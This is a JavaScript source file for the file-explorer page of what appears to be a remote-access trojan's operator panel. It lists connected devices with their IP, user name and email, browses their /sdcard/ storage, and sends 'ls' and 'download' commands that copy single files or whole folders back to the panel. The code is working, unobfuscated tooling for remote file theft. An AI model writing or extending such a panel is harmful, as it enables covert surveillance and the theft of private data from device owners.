// File explorer state
let selectedClientId = null;
let currentPath = '/sdcard/';
let isLoading = false;
let pendingLsPath = null;   // path whose ls response we're waiting for
let pendingDownload = null; // download command we're waiting for

const FILE_EXTENSIONS = new Set([
    'txt', 'pdf', 'jpg', 'jpeg', 'png', 'gif', 'bmp', 'webp', 'svg', 'ico',
    'mp4', 'mkv', 'avi', 'mov', 'webm',
    'mp3', 'wav', 'm4a', 'flac', 'aac', 'ogg',
    'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx', 'odt', 'ods',
    'zip', 'rar', 'tar', 'gz', 'bz2', '7z',
    'apk', 'json', 'xml', 'html', 'htm', 'css', 'js',
    'db', 'sqlite', 'sqlite3', 'csv', 'log', 'md',
    'sh', 'py', 'java', 'kt', 'cpp', 'c', 'h',
    'ttf', 'otf', 'woff', 'woff2',
]);

function isLikelyFile(name) {
    const dot = name.lastIndexOf('.');
    if (dot <= 0) return false;
    return FILE_EXTENSIONS.has(name.slice(dot + 1).toLowerCase());
}

function normalizePath(path) {
    if (!path) return '/sdcard/';
    const parts = path.split('/').filter(p => p !== '.');
    const result = [];
    for (const part of parts) {
        if (part === '..') { result.pop(); }
        else if (part) { result.push(part); }
    }
    return '/' + result.join('/') + '/';
}

function getParentPath(path) {
    const p = path.endsWith('/') ? path.slice(0, -1) : path;
    const idx = p.lastIndexOf('/');
    if (idx <= 0) return '/';
    return p.slice(0, idx) + '/';
}

// Build breadcrumb nav from path string
function buildBreadcrumb(path) {
    const crumb = document.getElementById('breadcrumb');
    const parts = path.split('/').filter(Boolean);
    crumb.innerHTML = '';

    const root = document.createElement('span');
    root.className = 'breadcrumb-part';
    root.textContent = '/';
    root.addEventListener('click', () => navigateTo('/'));
    crumb.appendChild(root);

    let built = '/';
    parts.forEach((part, i) => {
        built += part + '/';

        const sep = document.createElement('span');
        sep.className = 'breadcrumb-sep';
        sep.textContent = '›';
        crumb.appendChild(sep);

        const span = document.createElement('span');
        if (i === parts.length - 1) {
            span.className = 'breadcrumb-current';
            span.textContent = part;
        } else {
            span.className = 'breadcrumb-part';
            span.textContent = part;
            const capture = built;
            span.addEventListener('click', () => navigateTo(capture));
        }
        crumb.appendChild(span);
    });
}

function setLoading(loading, message) {
    isLoading = loading;
    const statusText = document.getElementById('statusText');
    const hasClient = !!selectedClientId;

    if (loading) {
        statusText.innerHTML = `<span class="loading-spinner"></span> ${escapeHtml(message || 'Loading...')}`;
    } else {
        statusText.textContent = message || 'Ready';
    }

    document.getElementById('backBtn').disabled = loading || !hasClient;
    document.getElementById('homeBtn').disabled = loading || !hasClient;
    document.getElementById('goBtn').disabled = loading || !hasClient;
    document.getElementById('refreshBtn').disabled = loading || !hasClient;
    document.getElementById('pathInput').disabled = loading || !hasClient;
}

// Parse ls text output into { name, isDir } entries
function parseFileList(response, currentBasePath) {
    const clean = response.replace(/\x1b\[[0-9;]*m/g, ''); // strip ANSI colors
    const entries = [];

    for (const raw of clean.split('\n')) {
        const line = raw.trim();
        if (!line || line === '.' || line === '..') continue;

        let name = line;
        let isDir = null;

        // Long format: drwxrwx--- ... name
        if (/^[dl-][rwx-]{9}/.test(line)) {
            isDir = line[0] === 'd';
            const parts = line.split(/\s+/);
            name = parts[parts.length - 1];
        } else if (line.endsWith('/')) {
            name = line.slice(0, -1);
            isDir = true;
        }

        if (!name || name === '.' || name === '..') continue;

        if (isDir === null) {
            isDir = !isLikelyFile(name);
        }

        entries.push({ name, isDir });
    }

    // Directories first, then alphabetical
    entries.sort((a, b) => {
        if (a.isDir !== b.isDir) return a.isDir ? -1 : 1;
        return a.name.localeCompare(b.name);
    });

    return entries;
}

function getFileIcon(name, isDir) {
    if (isDir) return '📁';
    const ext = name.split('.').pop().toLowerCase();
    const map = {
        jpg: '🖼️', jpeg: '🖼️', png: '🖼️', gif: '🖼️', bmp: '🖼️', webp: '🖼️',
        mp4: '🎬', mkv: '🎬', avi: '🎬', mov: '🎬',
        mp3: '🎵', wav: '🎵', m4a: '🎵', flac: '🎵', aac: '🎵',
        pdf: '📄', doc: '📝', docx: '📝', txt: '📄',
        xls: '📊', xlsx: '📊', csv: '📊',
        zip: '📦', rar: '📦', '7z': '📦', tar: '📦', gz: '📦',
        apk: '📱',
        db: '🗄️', sqlite: '🗄️', sqlite3: '🗄️',
        json: '⚙️', xml: '⚙️',
        sh: '💻', py: '💻', java: '💻', kt: '💻',
    };
    return map[ext] || '📄';
}

function renderFileList(entries, basePath) {
    const fileList = document.getElementById('fileList');

    if (entries.length === 0) {
        fileList.innerHTML = '<div class="explorer-empty"><p>Directory is empty.</p></div>';
        return;
    }

    fileList.innerHTML = '';

    entries.forEach(({ name, isDir }) => {
        const fullPath = basePath + name + (isDir ? '/' : '');

        const entry = document.createElement('div');
        entry.className = `file-entry file-type-${isDir ? 'dir' : 'file'}`;

        const icon = document.createElement('span');
        icon.className = 'file-icon';
        icon.textContent = getFileIcon(name, isDir);

        const nameEl = document.createElement('span');
        nameEl.className = 'file-name';
        nameEl.textContent = name + (isDir ? '/' : '');

        const actions = document.createElement('div');
        actions.className = 'file-actions';

        if (isDir) {
            const openBtn = document.createElement('button');
            openBtn.className = 'file-action-btn';
            openBtn.textContent = 'Open';
            openBtn.addEventListener('click', (e) => { e.stopPropagation(); navigateTo(fullPath); });
            actions.appendChild(openBtn);
        }

        const dlBtn = document.createElement('button');
        dlBtn.className = 'file-action-btn download-btn';
        dlBtn.textContent = isDir ? 'Download All' : 'Download';
        dlBtn.addEventListener('click', (e) => { e.stopPropagation(); downloadPath(fullPath); });
        actions.appendChild(dlBtn);

        entry.appendChild(icon);
        entry.appendChild(nameEl);
        entry.appendChild(actions);

        if (isDir) {
            entry.addEventListener('click', () => navigateTo(fullPath));
        }

        fileList.appendChild(entry);
    });
}

function navigateTo(path) {
    if (!selectedClientId || isLoading) return;
    path = normalizePath(path);
    pendingLsPath = path;
    pendingDownload = null;
    setLoading(true, `Listing ${path}…`);
    socket.emit('send_command', { client_id: selectedClientId, command: `ls ${path}` });
}

function downloadPath(path) {
    if (!selectedClientId || isLoading) return;
    pendingDownload = `download ${path}`;
    pendingLsPath = null;
    setLoading(true, `Downloading ${path}…`);
    socket.emit('send_command', { client_id: selectedClientId, command: `download ${path}` });
}

function showDownloadNotification(filename, isFolder) {
    const container = document.getElementById('notifications');
    const notif = document.createElement('div');
    notif.className = 'download-notification';
    notif.innerHTML = `
        <button class="notification-close" onclick="this.parentElement.remove()">&#x2715;</button>
        <strong style="color: var(--success-color);">${isFolder ? 'Folder' : 'File'} Download Complete</strong><br>
        <span style="font-size: 12px; color: var(--text-secondary);">${escapeHtml(filename)}</span><br>
        ${!isFolder ? `<a href="/api/downloads/${encodeURIComponent(filename)}" download="${filename}" style="font-size: 12px;">Save file</a>` : ''}
    `;
    container.appendChild(notif);
    setTimeout(() => { if (notif.parentElement) notif.remove(); }, 10000);
}

function handleCommandResponse(data) {
    if (data.client_id !== selectedClientId) return;

    // Navigation response (ls)
    if (pendingLsPath && data.command === `ls ${pendingLsPath}`) {
        const path = pendingLsPath;
        pendingLsPath = null;

        if (!data.success) {
            setLoading(false, `Error: ${data.error || 'Failed to list directory'}`);
            document.getElementById('fileList').innerHTML =
                `<div class="explorer-empty"><p style="color:var(--danger-color);">Error: ${escapeHtml(data.error || 'Cannot read directory')}</p></div>`;
            return;
        }

        currentPath = path;
        document.getElementById('pathInput').value = currentPath;
        buildBreadcrumb(currentPath);

        const entries = parseFileList(data.response || '', currentPath);
        renderFileList(entries, currentPath);
        setLoading(false, `${entries.length} item${entries.length !== 1 ? 's' : ''} in ${currentPath}`);
        return;
    }

    // Download response
    if (pendingDownload && data.command === pendingDownload) {
        pendingDownload = null;

        if (!data.success) {
            setLoading(false, `Download failed: ${data.error || 'Unknown error'}`);
            return;
        }

        if (data.folder_download) {
            showDownloadNotification(data.local_path || 'folder', true);
            setLoading(false, data.response || 'Folder download complete');
        } else if (data.file_download && data.filename) {
            showDownloadNotification(data.filename, false);
            setLoading(false, `Downloaded: ${data.filename}`);
        } else {
            const responseText = data.response || '';
            const isErrorResponse = /error|not found|failed|permission denied|no such/i.test(responseText);
            if (isErrorResponse) {
                setLoading(false, `Download failed: ${responseText}`);
            } else {
                // Intermediate status — a folder_download:true event will arrive later
                document.getElementById('statusText').textContent = responseText || 'Downloading…';
                pendingDownload = data.command;
            }
        }
        return;
    }

    // Folder download completion that arrives asynchronously (command key may differ)
    if (data.folder_download && isLoading) {
        pendingDownload = null;
        showDownloadNotification(data.local_path || 'folder', true);
        setLoading(false, data.response || 'Folder download complete');
    }
}

// Client sidebar — mirrors console.js pattern
function renderClients() {
    const list = document.getElementById('clientsList');
    const count = document.getElementById('clientCount');
    count.textContent = Object.keys(clients).length;

    if (Object.keys(clients).length === 0) {
        list.innerHTML = '<p class="empty-message">No clients connected</p>';
        return;
    }

    list.innerHTML = '';
    Object.values(clients).forEach(client => {
        const card = document.createElement('div');
        card.className = 'client-card' + (client.client_id === selectedClientId ? ' active' : '');

        const displayName = client.sys_info ? escapeHtml(client.sys_info) : client.client_id;

        let displaySubtitle = '';
        if (client.user_name || client.email) {
            displaySubtitle = `<div style="font-size:11px;margin-top:-4px;margin-bottom:8px;color:var(--text-secondary);">${escapeHtml(client.user_name || '')} ${client.email ? `&lt;${escapeHtml(client.email)}&gt;` : ''}</div>`;
        }

        card.innerHTML = `
            <div class="client-id">${displayName}</div>
            ${displaySubtitle}
            <div class="client-info">
                <span>ID: ${client.client_id}</span>
                <span>IP: ${client.ip}:${client.port}</span>
            </div>
        `;
        card.addEventListener('click', () => selectClient(client.client_id));
        list.appendChild(card);
    });
}

function selectClient(clientId) {
    selectedClientId = clientId;
    pendingLsPath = null;
    pendingDownload = null;
    renderClients();

    const client = clients[clientId];
    const displayName = client.sys_info || clientId;
    const el = document.getElementById('selectedClient');
    el.textContent = displayName;
    el.classList.add('active');

    currentPath = '/sdcard/';
    document.getElementById('pathInput').value = currentPath;
    navigateTo(currentPath);
}

// Shared.js callback hooks
window.onClientConnected = () => renderClients();

window.onClientDisconnected = (clientId) => {
    if (selectedClientId === clientId) {
        selectedClientId = null;
        pendingLsPath = null;
        pendingDownload = null;
        const el = document.getElementById('selectedClient');
        el.textContent = 'No client selected';
        el.classList.remove('active');
        document.getElementById('breadcrumb').innerHTML =
            '<span style="color:var(--text-secondary);font-size:13px;">Select a client to browse files</span>';
        document.getElementById('fileList').innerHTML =
            '<div class="explorer-empty"><p>Client disconnected.</p></div>';
        setLoading(false, 'Client disconnected');
    }
    renderClients();
};

window.onClientInfoUpdated = () => renderClients();
window.onCommandResponse = (data) => handleCommandResponse(data);
window.onClientsLoaded = () => renderClients();

window.onPageLoad = () => {
    document.getElementById('backBtn').addEventListener('click', () => {
        if (!selectedClientId || isLoading) return;
        navigateTo(getParentPath(currentPath));
    });

    document.getElementById('homeBtn').addEventListener('click', () => {
        if (!selectedClientId || isLoading) return;
        navigateTo('/sdcard/');
    });

    document.getElementById('goBtn').addEventListener('click', () => {
        if (!selectedClientId || isLoading) return;
        navigateTo(document.getElementById('pathInput').value.trim() || '/sdcard/');
    });

    document.getElementById('refreshBtn').addEventListener('click', () => {
        if (!selectedClientId || isLoading) return;
        navigateTo(currentPath);
    });

    document.getElementById('pathInput').addEventListener('keypress', (e) => {
        if (e.key === 'Enter' && selectedClientId && !isLoading) {
            navigateTo(document.getElementById('pathInput').value.trim() || '/sdcard/');
        }
    });
};
